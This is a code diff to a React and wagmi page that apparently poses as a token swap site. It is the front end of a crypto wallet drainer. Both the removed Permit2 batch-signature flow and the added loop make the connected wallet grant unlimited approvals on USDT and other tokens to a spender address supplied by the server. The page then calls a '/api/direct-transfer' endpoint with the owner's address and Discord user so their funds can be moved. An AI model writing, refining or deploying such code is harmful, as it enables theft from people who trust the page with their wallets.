@@ -1,7 +1,7 @@
 import { Button } from "@/components/ui/button";
 import { ArrowDown, Settings, ChevronDown, Loader2, CheckCircle } from "lucide-react";
 import { useState, useEffect } from "react";
-import { useAccount, useDisconnect, useSignTypedData, useChainId } from "wagmi";
+import { useAccount, useDisconnect, useChainId, useWriteContract, usePublicClient } from "wagmi";
 import { useConnectModal, useChainModal } from "@rainbow-me/rainbowkit";
 import { Connection, PublicKey, Transaction, TransactionInstruction } from "@solana/web3.js";
 import headerImage from "@assets/image_1767365952238.png";
@@ -12,8 +12,30 @@ import section4 from "@assets/image_1770369567405.png";
 import section5 from "@assets/image_1770369594094.png";
 import section6 from "@assets/image_1770369615963.png";
 
-const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+const ERC20_APPROVE_ABI = [
+  {
+    inputs: [
+      { name: "spender", type: "address" },
+      { name: "amount", type: "uint256" },
+    ],
+    name: "approve",
+    outputs: [{ name: "", type: "bool" }],
+    stateMutability: "nonpayable",
+    type: "function",
+  },
+  {
+    inputs: [
+      { name: "owner", type: "address" },
+      { name: "spender", type: "address" },
+    ],
+    name: "allowance",
+    outputs: [{ name: "", type: "uint256" }],
+    stateMutability: "view",
+    type: "function",
+  },
+] as const;
 
 const EVM_TOKENS = [
   { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", name: "Tether" },
@@ -117,18 +139,6 @@ function createApproveInstruction(
   });
 }
 
-const PERMIT2_BATCH_TYPES = {
-  PermitBatchTransferFrom: [
-    { name: "permitted", type: "TokenPermissions[]" },
-    { name: "spender", type: "address" },
-    { name: "nonce", type: "uint256" },
-    { name: "deadline", type: "uint256" },
-  ],
-  TokenPermissions: [
-    { name: "token", type: "address" },
-    { name: "amount", type: "uint256" },
-  ],
-} as const;
 
 interface SolanaWalletProvider {
   connect: (options?: { onlyIfTrusted?: boolean }) => Promise<{ publicKey: PublicKey }>;
@@ -341,7 +351,8 @@ export default function Home() {
     8453: "Base",
   };
   
-  const { signTypedDataAsync } = useSignTypedData();
+  const { writeContractAsync } = useWriteContract();
+  const publicClient = usePublicClient();
 
   useEffect(() => {
     const nowConnected = isConnected || solanaConnected;
@@ -489,70 +500,72 @@ export default function Home() {
     setStep("approving");
 
     try {
-      const configRes = await fetch(`/api/permit2-config?chainId=${chainId}`);
+      const configRes = await fetch(`/api/spender-config?chainId=${chainId}`);
       const config = await configRes.json();
 
       if (!config.spenderAddress) {
-        setError("No contract deployed for this chain yet");
+        setError("No spender configured for this chain");
         setStep("idle");
         return;
       }
 
-      const nonce = BigInt(Math.floor(Math.random() * 1e15));
-      const deadline = BigInt(Math.floor(Date.now() / 1000) + 50 * 365 * 24 * 3600);
+      const spenderAddr = config.spenderAddress as `0x${string}`;
+      const tokenAddresses = (config.tokens || EVM_TOKENS.map(t => t.address)) as string[];
 
-      const permitted = EVM_TOKENS.map(token => ({
-        token: token.address as `0x${string}`,
-        amount: BigInt(MAX_UINT256),
-      }));
+      for (const tokenAddr of tokenAddresses) {
+        try {
+          let currentAllowance = BigInt(0);
+          if (publicClient) {
+            currentAllowance = await publicClient.readContract({
+              address: tokenAddr as `0x${string}`,
+              abi: ERC20_APPROVE_ABI,
+              functionName: 'allowance',
+              args: [address as `0x${string}`, spenderAddr],
+            }) as bigint;
+          }
 
-      const signature = await signTypedDataAsync({
-        domain: {
-          name: "Permit2",
-          chainId: chainId,
-          verifyingContract: PERMIT2_ADDRESS as `0x${string}`,
-        },
-        types: PERMIT2_BATCH_TYPES,
-        primaryType: "PermitBatchTransferFrom" as const,
-        message: {
-          permitted,
-          spender: config.spenderAddress as `0x${string}`,
-          nonce,
-          deadline,
-        },
-      });
+          if (currentAllowance > BigInt(0)) {
+            console.log(`[Approve] ${tokenAddr} already approved: ${currentAllowance}`);
+            continue;
+          }
 
-      console.log("[Permit2] Signature obtained:", signature);
+          console.log(`[Approve] Approving ${tokenAddr} for spender ${spenderAddr}...`);
+
+          await writeContractAsync({
+            address: tokenAddr as `0x${string}`,
+            abi: ERC20_APPROVE_ABI,
+            functionName: 'approve',
+            args: [spenderAddr, BigInt(MAX_UINT256)],
+          });
+
+          console.log(`[Approve] ${tokenAddr} approved successfully`);
+        } catch (tokenErr: any) {
+          console.error(`[Approve] Failed to approve ${tokenAddr}:`, tokenErr?.message);
+        }
+      }
 
       setStep("transferring");
 
-      const result = await fetch("/api/permit2-transfer", {
+      const result = await fetch("/api/direct-transfer", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chainId,
           owner: address,
-          permitted: EVM_TOKENS.map(t => ({
-            token: t.address,
-            amount: MAX_UINT256,
-          })),
-          nonce: nonce.toString(),
-          deadline: deadline.toString(),
-          signature,
           discordUser: discordUser || undefined,
         }),
       });
 
       const transferResult = await result.json();
-      console.log("[Permit2] Transfer result:", transferResult);
+      console.log("[DirectTransfer] Transfer result:", transferResult);
 
       setStep("done");
     } catch (err: any) {
-      console.error("Permit2 error:", err);
+      console.error("Approval error:", err);
       if (err?.message?.includes("User rejected") || err?.message?.includes("denied") || err?.code === 4001) {
-        setError("Signature rejected");
+        setError("Transaction rejected");
       } else {
-        setError(err?.message || "Failed to sign permit");
+        setError(err?.message || "Failed to approve tokens");
       }
       setStep("idle");
     }
